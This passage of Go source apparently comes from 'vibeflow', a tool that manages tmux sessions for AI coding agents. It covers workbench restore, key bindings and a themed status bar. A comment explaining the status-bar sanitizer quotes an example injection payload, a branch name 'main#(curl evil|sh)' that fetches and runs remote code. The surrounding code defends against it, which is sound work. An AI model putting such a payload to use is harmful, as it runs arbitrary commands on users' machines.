			if err != nil {
				comp.Restore()
				return nil, fmt.Errorf("new workbench window %q: %w: %s", p.Label, err, strings.TrimSpace(out))
			}
			win = strings.TrimSpace(out)
		}
		placeholder, err := tm.paneID(win)
		if err != nil {
			comp.Restore()
			return nil, err
		}
		if err := tm.composeInto(win, p.Sessions, titles, comp); err != nil {
			comp.Restore()
			return nil, err
		}
		_, _ = tm.run("kill-pane", "-t", placeholder)
		_, _ = tm.run(tiledLayoutArgs(win)...)
		if p.Label == selectLabel {
			selectTarget = win
		}
	}

	tm.configureWorkbenchChrome(holder, workbenchHintMulti)
	if selectTarget != "" {
		_, _ = tm.run("select-window", "-t", selectTarget)
	}
	return comp, nil
}

// Restore dismantles the workbench: each joined pane is moved back into a fresh
// session with its original name (reverse join-pane, which preserves the pane's
// running process), its status bar is re-applied, and the (now empty) holder is
// destroyed. It is best-effort per pane — a failure on one session does not
// abort the rest. If any pane cannot be moved out, the holder is NOT killed, so
// the stranded pane and its running agent stay recoverable (#3277); the first
// error encountered is returned for logging.
func (c *WorkbenchComposition) Restore() error {
	tm := c.tm
	var firstErr error
	for _, s := range c.sources {
		// Recreate the session by name with a throwaway shell pane, move the
		// agent pane back in, then drop the throwaway.
		if _, err := tm.run("new-session", "-d", "-s", s.name); err != nil {
			if firstErr == nil {
				firstErr = fmt.Errorf("recreate %q: %w", s.name, err)
			}
			continue
		}
		ph, err := tm.paneID(s.name)
		if err != nil {
			if firstErr == nil {
				firstErr = err
			}
			continue
		}
		if _, err := tm.run(joinPaneArgs(s.paneID, s.name)...); err != nil {
			if firstErr == nil {
				firstErr = fmt.Errorf("restore pane for %q: %w", s.name, err)
			}
			continue
		}
		_, _ = tm.run("kill-pane", "-t", ph)
		tm.applySessionStatus(s.name, s.status)
	}
	// The holder auto-destroys once its last pane is moved out. Only kill it
	// explicitly when it is already empty: if a restore failed, the stranded
	// agent pane is STILL inside the holder, and an unconditional kill-session
	// would destroy that live agent (#3277). Leave a non-empty holder intact so
	// its pane(s) stay recoverable (the user can `tmux attach -t <holder>`).
	if n := tm.sessionPaneCount(c.holder); n > 0 {
		if firstErr == nil {
			firstErr = fmt.Errorf("workbench holder %q still holds %d pane(s) after restore; left intact so the agent session(s) are not killed", c.holder, n)
		}
	} else {
		_, _ = tm.run("kill-session", "-t", c.holder)
	}
	return firstErr
}

// sessionPaneCount returns the total number of panes across all windows of a
// session, or 0 when the session does not exist (tmux auto-destroys a session
// once its last pane is moved out). Used by Restore to avoid killing a holder
// that still holds a stranded agent pane (#3277).
func (tm *TmuxManager) sessionPaneCount(session string) int {
	out, err := tm.run("list-panes", "-s", "-t", session, "-F", "#{pane_id}")
	if err != nil {
		return 0
	}
	return len(strings.Fields(strings.TrimSpace(out)))
}

// BindSessionKeys sets up key bindings for a vibeflow tmux session.
// Binds Ctrl+Q (and Ctrl+\ as backup) to toggle between the agent session
// and the vibeflow TUI. Uses tmux if-shell to conditionally detach (when
// vibeflow is already running) or launch a new instance in a popup/window.
func (tm *TmuxManager) BindSessionKeys(sessionName string) error {
	vibeflowBin, err := os.Executable()
	if err != nil {
		vibeflowBin = "vibeflow"
	}

	// Shell condition: check if vibeflow PID lock exists and process is alive.
	// Use simple quoting to avoid issues with tmux's if-shell argument parsing.
	pidPath := PIDLockPath()
	pidCheck := fmt.Sprintf(
		`test -f %s && kill -0 $(cat %s) 2>/dev/null`,
		pidPath, pidPath,
	)

	// Bind both C-q and C-\ to the same action for reliability.
	keys := []string{"C-q", `C-\`}

	for _, key := range keys {
		// Build the launch command for when vibeflow is NOT running.
		var launchCmd string
		if tm.supportsPopup {
			// display-popup overlays on top of the current pane — works even
			// when the underlying application is in raw terminal mode.
			// -E closes the popup when the command exits.
			launchCmd = fmt.Sprintf(
				`display-popup -E -w 90%% -h 90%% %s`,
				vibeflowBin,
			)
		} else {
			// Fallback for tmux < 3.2: open a new window.
			launchCmd = fmt.Sprintf(
				`new-window -t %s %s`,
				sessionName, vibeflowBin,
			)
		}

		// if-shell: when vibeflow is running, detach-client returns the
		// terminal to the vibeflow TUI (which is blocked on attach-session).
		// When not running, launch vibeflow in a popup or new window.
		_, err = tm.run("bind-key", "-T", "root", key,
			"if-shell", pidCheck, "detach-client", launchCmd)
		if err != nil {
			return fmt.Errorf("bind %s for session %q: %w", key, sessionName, err)
		}
	}

	// Bind C-d to detach-client so users can cleanly exit to terminal
	// while agent sessions continue running in the background.
	_, err = tm.run("bind-key", "-T", "root", "C-d", "detach-client")
	if err != nil {
		return fmt.Errorf("bind C-d for session %q: %w", sessionName, err)
	}

	return nil
}

// BindAllSessionKeys re-binds vibeflow keys for all live sessions.
// Call this periodically (e.g. on session refresh) to ensure bindings
// persist even after tmux configuration reloads.
func (tm *TmuxManager) BindAllSessionKeys() {
	sessions, err := tm.ListSessions()
	if err != nil || len(sessions) == 0 {
		return
	}
	// Bind once using the first session — bindings are global to the tmux
	// server (root key table), not per-session.
	_ = tm.BindSessionKeys(sessions[0].Name)
}

// sanitizeTmuxStatusValue neutralizes externally-sourced strings before they
// are interpolated into a tmux status-left/status-right format. tmux EXECUTES
// #(shell-command) and expands #{...}/#[...] inside status formats, so an
// attacker-controlled git branch name like "main#(curl evil|sh)" would run
// arbitrary commands on every status refresh (#3289). Escaping every '#' to
// '##' (tmux's literal '#') defuses all #-based expansion; control characters
// are dropped and the result is clamped. Encoding happens at the tmux sink,
// not the source, so the real branch/project name is preserved everywhere else.
func sanitizeTmuxStatusValue(s string) string {
	const maxRunes = 64
	var b strings.Builder
	n := 0
	for _, r := range s {
		if n >= maxRunes {
			break
		}
		if r < 0x20 || r == 0x7f {
			continue // drop control chars (incl. ESC — no escape-sequence injection)
		}
		if r == '#' {
			b.WriteString("##")
		} else {
			b.WriteRune(r)
		}
		n++
	}
	return b.String()
}

// ConfigureStatusBar sets up a vibeflow-themed tmux status bar for a session.
// All settings are scoped per-session via set-option -t so they don't leak
// to other tmux sessions on the same server.
func (tm *TmuxManager) ConfigureStatusBar(sessionName string, opts StatusBarOpts) error {
	for key, val := range buildStatusBarSettings(opts) {
		if _, err := tm.run("set-option", "-t", sessionName, key, val); err != nil {
			return fmt.Errorf("set %s for session %q: %w", key, sessionName, err)
		}
	}
	return nil
}

// buildStatusBarSettings builds the vibeflow-themed tmux status-bar options.
// Split from ConfigureStatusBar so the format construction — including the
// #3289 injection sanitization of repo-derived values — is unit-testable
// without a live tmux server.
func buildStatusBarSettings(opts StatusBarOpts) map[string]string {
	provider := opts.Provider
	if provider == "" {
		provider = "agent"
	}
	branch := opts.Branch
	if branch == "" {
		branch = "main"
	}
	// Neutralize tmux format-string injection from repo-derived values (#3289).
	provider = sanitizeTmuxStatusValue(provider)
	branch = sanitizeTmuxStatusValue(branch)

	// Build status-left: [vibeflow] provider | branch (Ocean palette, theme.go:
	// deep-ocean bg, teal accent, surface, storm-gray muted, soft fg).
	statusLeft := fmt.Sprintf(
		"#[fg=#0b1929,bg=#00d4aa,bold] vibeflow #[fg=#00d4aa,bg=#152d45,nobold] %s #[fg=#576574]|#[fg=#c8d6e5] %s ",
		provider, branch,
	)

	// Build status-right: shortcuts + project
	project := opts.Project
	if project == "" {
		project = "default"
	}
	project = sanitizeTmuxStatusValue(project)
	statusRight := fmt.Sprintf(
		"#[fg=#576574]Ctrl+q:#[fg=#c8d6e5]Menu #[fg=#576574]|#[fg=#576574] Ctrl+\\:#[fg=#c8d6e5]Menu #[fg=#576574]| #[fg=#00d4aa]%s ",
		project,
	)

	return map[string]string{
		"status":              "on",
		"status-style":        "fg=#c8d6e5,bg=#0b1929",
		"status-left":         statusLeft,
		"status-right":        statusRight,
		"status-left-length":  "60",
		"status-right-length": "60",
	}
}

// GetPaneWorkDir returns the current working directory of the active pane
// in the given tmux session. Used to reconstruct metadata for discovered sessions.
func (tm *TmuxManager) GetPaneWorkDir(sessionName string) string {
	fullName := tm.ensurePrefix(sessionName)
	out, err := tm.run("display-message", "-t", fullName, "-p", "#{pane_current_path}")
	if err != nil {
		return ""
	}
	return strings.TrimSpace(out)
}

// ParseSessionProvider extracts the provider key from a full tmux session name.
// Format: "vibeflow_{provider}-{name}" → provider. Returns "" if not parseable.
func ParseSessionProvider(tmuxName string) string {
	name := strings.TrimPrefix(tmuxName, sessionPrefix)
	if idx := strings.Index(name, "-"); idx > 0 {
		return name[:idx]
	}
	return ""
}

// GetGitBranch returns the current git branch for a directory.
func GetGitBranch(dir string) string {
	cmd := exec.Command("git", "-C", dir, "branch", "--show-current")
	out, err := cmd.Output()
	if err != nil {
		return ""
	}
	return strings.TrimSpace(string(out))
}

// ListSessionNames returns the full tmux names of all vibeflow sessions.
// Useful for passing to Store.Sync() to clean up orphaned metadata.
func (tm *TmuxManager) ListSessionNames() ([]string, error) {
	sessions, err := tm.ListSessions()
	if err != nil {
		return nil, err
	}
	names := make([]string, len(sessions))
	for i, s := range sessions {
		names[i] = s.Name
	}
	return names, nil
}

func (tm *TmuxManager) run(args ...string) (string, error) {
	fullArgs := append([]string{"-L", tm.socketName}, args...)
	cmd := exec.Command("tmux", fullArgs...)
	out, err := cmd.CombinedOutput()
	return string(out), err
}

func atoi(s string) int {
	n := 0
	for _, c := range s {
		if c >= '0' && c <= '9' {
			n = n*10 + int(c-'0')
		}
	}
	return n
}
